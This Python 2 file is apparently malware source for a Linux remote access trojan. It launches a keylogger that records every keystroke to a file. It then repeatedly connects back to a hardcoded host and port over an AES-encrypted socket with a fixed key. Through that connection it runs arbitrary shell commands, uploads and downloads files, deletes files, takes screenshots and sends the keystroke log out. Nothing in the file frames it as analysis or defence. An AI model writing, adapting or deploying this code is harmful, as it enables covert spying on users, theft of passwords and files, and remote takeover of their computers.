#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys
import gtk.gdk
try:
	import pyxhook
except ImportError:
	os.system("pip install pyxhook")

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "abcdefghijklmnopqrstuvwxyz123456"

# create a cipher object using the random secret
# choose a secret IV as well and match on server+client
iv = '1111111111111111'
cipher = AES.new(secret,AES.MODE_CFB,iv)

# server config
HOST = '192.168.82.149'
PORT = 413

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
	
# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
       
	return data[:-len(end)]

# upload file
def Upload(sock, filename):
	bgtr = True
	# file transfer
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			# begin sending file
			
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	# let server know we're done..
	print " started sending file"
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
	
# download file
def Download(sock, filename):
	# file transfer
	g = open(filename, 'wb')
	# download file
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	# let server know we're done..
	return "Finished upload."
# screen shot for linux
def screenshota():
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
	#print "The size of the window is %d x %d" % sz
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
    if (pb != None):
    	pb.save("screenshot.png","png")
    else:
    	Send(s,"unable to get screen shot \n"+ os.getcwd()+">")


# Keylogger for linux
def keylogger():
	
	
	#change this to your log file's path
     
        log_file="file.log"

	#this function is called everytime a key is pressed.
	def OnKeyPress(event):
                global closevar
            
  		fob=open(log_file,'a')
                #if event.Key != "Return":
  		fob.write(event.Key)
                if event.Key == "Return":
        	    fob.write('\n')

  	        if   closevar==999: 
                    print "keylogger closing"
    		    fob.close()
    		    new_hook.cancel()
	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPress
	#hook the keyboard
	new_hook.HookKeyboard()
	#start the session
	new_hook.start()
closevar=5
keylogger()
# main loop
while True:
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))

		# waiting to be activated...
                data = Receive(s)
	
		# activate.
		if data == 'Activate':
			active = True
			Send(s, "\n"+os.getcwd()+">")
		
		# interactive loop
		while active:
                     
			
			# Receive data
			data = Receive(s)
			if data=="keylogger":
                                #closevar=999
				stdoutput = Upload(s, "file.log")
                                
                        if data.startswith("delete ")== True:
                            dele=str(data[7:])
                            if os.path.exists(dele)==False:
                                Send(s,"file not found \n"+ os.getcwd()+">")
                                continue
            	            os.remove(dele)
                            stderr=" "
                            data=" "
                            
                        
                            
                            	                
                        if data=="start http":
                            data="python -m SimpleHTTPServer 5000"
                        # check for quit
			if data == "quit" or data == "terminate":
			    Send(s, "quitted")
                            #open('file.log', 'w').close()
			    break
				
			# check for change directory
			elif data.startswith("cd ") == True:
				os.chdir(data[3:])
				stdoutput = ""
                        elif data.startswith("download") ==True:
			# check for download
                            
                            # Upload
                            stdoutput=Upload(s,data[9:])
                            
                        elif data.startswith("screenshot"):
                            screenshota()
                            stdoutput=Upload(s,data)
                            os.remove(data)
			# check for upload
			elif data.startswith("upload ") == True:
                            
                            # Download the file
                            stdoutput = Download(s, data[7:])

			else:
				# execute command
			    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

				# save output/error
			    stdoutput = proc.stdout.read() + proc.stderr.read()
				
			# send data
			stdoutput = stdoutput+"\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		if data == "terminate":
		
  		    closevar=999	              
                    s.shutdown(socket.SHUT_RDWR)
		    s.close()
                    break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
	      
